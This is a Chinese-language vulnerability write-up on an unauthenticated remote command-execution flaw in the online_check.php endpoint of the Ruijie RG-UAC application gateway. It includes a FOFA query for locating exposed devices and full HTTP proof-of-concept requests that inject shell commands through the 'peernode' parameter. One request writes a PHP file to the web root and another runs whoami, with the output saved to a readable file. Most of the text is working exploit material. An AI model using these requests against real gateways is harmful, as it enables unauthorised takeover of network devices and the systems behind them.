# 锐捷RG-UAC应用网关online_check.php前台RCE漏洞

### 一、漏洞描述
<font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关 online_check.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>

### 二、影响版本
锐捷RG-UAC应用网关

### 三、资产测绘
fofa：app="Ruijie-RG-UAC"

特征：

![1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115.png](./img/dW2Qo23Th4j1ct2P/1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115-117320.png)

### 四、漏洞复现
访问该链接出现如下页面表示可能存在漏洞

```java
/view/vpn/autovpn/online_check.php
```

![1710431715996-8076fb25-cda8-46d5-98cc-ba2f96e1c4ad.png](./img/dW2Qo23Th4j1ct2P/1710431715996-8076fb25-cda8-46d5-98cc-ba2f96e1c4ad-365591.png)

```java
iii:0,hit:0 
```

通过以下poc写入文件

```java
GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==%20|%20base64%20-d%20%3E%20test.php` HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
```

![1710431853374-b1498b38-c30c-43f0-8893-fa8e7893337f.png](./img/dW2Qo23Th4j1ct2P/1710431853374-b1498b38-c30c-43f0-8893-fa8e7893337f-478863.png)

文件写入位置

```java
/view/vpn/autovpn/test.php
```

![1710431872991-5400bcfa-93cf-4df9-9e50-f00e5c241555.png](./img/dW2Qo23Th4j1ct2P/1710431872991-5400bcfa-93cf-4df9-9e50-f00e5c241555-640890.png)通过如下poc执行命令

```java
GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`whoami%20>%201.txt` HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
```

![1710431969941-59a7fcd6-882f-425d-85e2-d70c10e71bba.png](./img/dW2Qo23Th4j1ct2P/1710431969941-59a7fcd6-882f-425d-85e2-d70c10e71bba-586973.png)

获取命令执行结果

```java
/view/vpn/autovpn/1.txt
```

![1710431991407-1d277e48-b876-4742-adcf-ca69ccb757d9.png](./img/dW2Qo23Th4j1ct2P/1710431991407-1d277e48-b876-4742-adcf-ca69ccb757d9-381585.png)



> 更新: 2024-06-24 11:42:29  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ektr1dwcngu6c0ct>